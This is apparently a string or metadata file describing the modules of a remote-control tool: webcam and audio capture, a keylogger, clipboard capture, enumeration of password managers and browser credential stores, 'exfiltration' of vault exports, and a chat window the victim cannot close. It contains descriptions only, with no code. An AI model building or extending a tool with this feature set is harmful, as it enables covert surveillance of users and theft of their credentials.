modules.title: Application VNC
modules.description: Launches curated applications inside a disposable workspace and streams them through VNC.

capabilities.name: app-vnc.launch
capabilities.description: Clone per-application profiles and start virtualized sessions.

modules.title: Remote Desktop
modules.description: Interactive remote desktop streaming and operator input relay.

capabilities.name: Desktop streaming
capabilities.description: Stream high-fidelity desktop frames to the controller UI.

capabilities.name: Input relay
capabilities.description: Relay keyboard and pointer events back to the remote host.

capabilities.name: QUIC transport
capabilities.description: Provide QUIC transport negotiation for resilient input streams.

capabilities.name: HEVC encoding
capabilities.description: Enable hardware-accelerated HEVC streaming when supported.

capabilities.name: Performance telemetry
capabilities.description: Collect frame quality and adaptive bitrate metrics for dashboards.

telemetry.name: Performance telemetry
telemetry.description: Emit adaptive streaming metrics describing encoder performance and transport health.

modules.title: Webcam Control
modules.description: Enumerate and control remote webcam devices.

capabilities.name: webcam.enumerate
capabilities.description: Enumerate connected webcam devices and capabilities.

capabilities.name: webcam.stream
capabilities.description: Initiate webcam streaming sessions when supported.

modules.title: Audio Control
modules.description: Capture and inject audio for synchronized operator coordination.

capabilities.name: Audio capture
capabilities.description: Capture remote system audio for monitoring and recording.

capabilities.name: Audio injection
capabilities.description: Inject operator-provided audio streams into the remote session.

telemetry.name: Audio telemetry
telemetry.description: Report capture bridge levels, buffer health, and device availability to the controller.

modules.title: Keylogger
modules.description: Capture keystrokes and related telemetry from the remote host.

capabilities.name: keylogger.stream
capabilities.description: Stream keystroke telemetry to the controller in near real time.

capabilities.name: keylogger.batch
capabilities.description: Batch keystrokes offline and upload on a schedule.

modules.title: Clipboard Manager
modules.description: Synchronize clipboard contents between the operator and remote workstation.

capabilities.name: Clipboard capture
capabilities.description: Capture clipboard changes emitted by the remote workstation.

capabilities.name: Clipboard push
capabilities.description: Push operator clipboard payloads to the remote host.

modules.title: File Manager
modules.description: Inspect and manage the remote file system.

capabilities.name: file-manager.explore
capabilities.description: Enumerate directories and retrieve file contents from the host.

capabilities.name: file-manager.modify
capabilities.description: Create, update, move, and delete files and directories on demand.

modules.title: Task Manager
modules.description: Enumerate and control processes on the remote host.

capabilities.name: task-manager.list
capabilities.description: Collect real-time process snapshots with metadata.

capabilities.name: task-manager.control
capabilities.description: Start and orchestrate process actions on demand.

modules.title: TCP Connections
modules.description: Enumerate and govern active TCP sockets exposed by the host.

capabilities.name: tcp-connections.enumerate
capabilities.description: Collect real-time socket state with process attribution.

capabilities.name: tcp-connections.control
capabilities.description: Stage enforcement actions for suspicious remote peers.

modules.title: Recovery Operations
modules.description: Stage, track, and collect recovery payloads across modules.

capabilities.name: Recovery queue
capabilities.description: Queue recovery jobs for background execution and monitoring.

capabilities.name: Artifact collection
capabilities.description: Collect artifacts staged by upstream modules for exfiltration.

capabilities.name: Vault export collection
capabilities.description: Stage and exfiltrate vault exports via the recovery pipeline.

modules.title: Client Chat
modules.description: Persistent two-way chat channel that the client cannot dismiss locally.

capabilities.name: Persistent window
capabilities.description: Keep the chat interface open continuously and respawn it if terminated.

capabilities.name: Alias control
capabilities.description: Allow the controller to update operator and client aliases in real time.

modules.title: System Information
modules.description: Collect host metadata, hardware configuration, and telemetry snapshots.

capabilities.name: System snapshot
capabilities.description: Produce structured operating system and hardware inventories.

capabilities.name: System telemetry
capabilities.description: Surface live telemetry metrics used by scheduling and recovery modules.

capabilities.name: Vault enumeration
capabilities.description: Enumerate installed password managers and browser credential stores.

telemetry.name: System telemetry
telemetry.description: Stream host performance counters, thermal states, and resource utilization snapshots.

modules.title: Incident Notes
modules.description: Secure local note taking synchronized with the controller vault.

capabilities.name: Notes sync
capabilities.description: Synchronize local incident notes to the operator vault with delta compression.
